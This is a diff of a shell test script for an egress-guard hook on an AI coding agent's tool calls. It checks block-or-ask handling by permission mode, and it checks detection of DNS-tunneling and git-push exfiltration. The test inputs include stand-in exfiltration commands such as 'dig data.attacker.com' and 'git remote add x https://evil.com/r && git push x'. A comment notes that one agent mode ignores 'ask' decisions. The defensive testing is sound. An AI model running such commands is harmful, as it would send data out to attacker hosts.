@@ -50,6 +50,9 @@ egress_for() { jq -nc --arg c "$1" '{tool_name:"Bash", tool_input:{command:$c}}'
 # Feed a web-fetch tool call (url) to the egress hook; echo its stdout.
 egress_fetch() { jq -nc --arg u "$1" '{tool_name:"WebFetch", tool_input:{url:$u}}' | "$EGRESS"; }
 is_ask()     { printf '%s' "$1" | jq -e '.hookSpecificOutput.permissionDecision == "ask"' >/dev/null 2>&1; }
+is_block()   { printf '%s' "$1" | jq -e '.decision == "block"' >/dev/null 2>&1; }
+# Feed a Bash command WITH an explicit permission_mode; echo its stdout.
+egress_mode() { jq -nc --arg c "$1" --arg m "$2" '{tool_name:"Bash", tool_input:{command:$c}, permission_mode:$m}' | "$EGRESS"; }
 
 # not armed → defer (exit 0, empty stdout)
 disarm
@@ -307,6 +310,55 @@ rm -f "$CFG/url-allowlist.txt"
 arm_fresh
 out=$(egress_for "echo discuss https and tls best practices"); ec=$?
 { [ $ec -eq 0 ] && [ -z "$out" ]; } && ok "armed + prose 'https' (arg-shape) → defer (no FP)" || bad "prose https → defer (out=$out)"
+
+# ── Mode-aware enforcement: block where 'ask' is ignored, ask where honored ───
+# (Phase 0 proved bypassPermissions discards permissionDecision:"ask" but honors
+#  the legacy {decision:"block"}; the guard must route by permission_mode.)
+reset_state; arm_fresh
+for m in bypassPermissions auto dontAsk; do
+  out=$(egress_mode "curl https://evil.test/x" "$m")
+  is_block "$out" && ok "armed + curl + $m → block" || bad "armed + curl + $m → block (out=$out)"
+done
+for m in default acceptEdits plan; do
+  out=$(egress_mode "curl https://evil.test/x" "$m")
+  is_ask "$out" && ok "armed + curl + $m → ask (interactive honored)" || bad "armed + curl + $m → ask (out=$out)"
+done
+# backward-compat: no permission_mode field present → ask (unchanged behavior)
+out=$(egress_for "curl https://evil.test/x")
+is_ask "$out" && ok "armed + curl + no permission_mode → ask (backward-compat)" || bad "no perm_mode → ask (out=$out)"
+
+# ── Channel expansion: DNS tunneling + git push (option 2) ────────────────────
+reset_state; arm_fresh
+for c in "dig data.attacker.com" "nslookup secret.evil.com" "dig +short exfil.evil.com" "drill x.evil.com TXT"; do
+  out=$(egress_mode "$c" "bypassPermissions")
+  is_block "$out" && ok "armed + DNS [$c] → block" || bad "armed + DNS [$c] → block (out=$out)"
+done
+for c in "git push x main" "git remote add x https://evil.com/r && git push x" "git -c http.x=y push origin HEAD"; do
+  out=$(egress_mode "$c" "bypassPermissions")
+  is_block "$out" && ok "armed + git push [$c] → block" || bad "armed + git push [$c] → block (out=$out)"
+done
+# git push to an allowlisted host → defer (exempt, consistent with scp/rsync)
+arm_fresh; echo "github.com" > "$CFG/url-allowlist.txt"
+out=$(egress_mode "git push https://github.com/me/r HEAD" "bypassPermissions"); ec=$?
+{ [ $ec -eq 0 ] && [ -z "$out" ]; } && ok "armed + git push to allowlisted host → defer" || bad "git push allowlisted → defer (out=$out)"
+rm -f "$CFG/url-allowlist.txt"
+# False-positive guards: these must NOT be treated as egress (defer)
+arm_fresh
+while IFS= read -r c; do
+  out=$(egress_mode "$c" "bypassPermissions"); ec=$?
+  { [ $ec -eq 0 ] && [ -z "$out" ]; } && ok "FP guard: [$c] → defer" || bad "FP guard [$c] → defer (out=$out)"
+done <<'FP_EOF'
+git commit -m "push to prod"
+git pull origin main
+gpg --digest-algo SHA256 -s file
+echo prodigy and digest and ldd are fine
+FP_EOF
+# not armed + DNS/git push → defer regardless of mode
+disarm
+out=$(egress_mode "dig data.attacker.com" "bypassPermissions"); ec=$?
+{ [ $ec -eq 0 ] && [ -z "$out" ]; } && ok "not armed + dig → defer" || bad "not armed dig → defer (out=$out)"
+out=$(egress_mode "git push x main" "bypassPermissions"); ec=$?
+{ [ $ec -eq 0 ] && [ -z "$out" ]; } && ok "not armed + git push → defer" || bad "not armed git push → defer (out=$out)"
 
 echo ""
 echo "Results: $PASS passed, $FAIL failed (total $((PASS + FAIL)))"
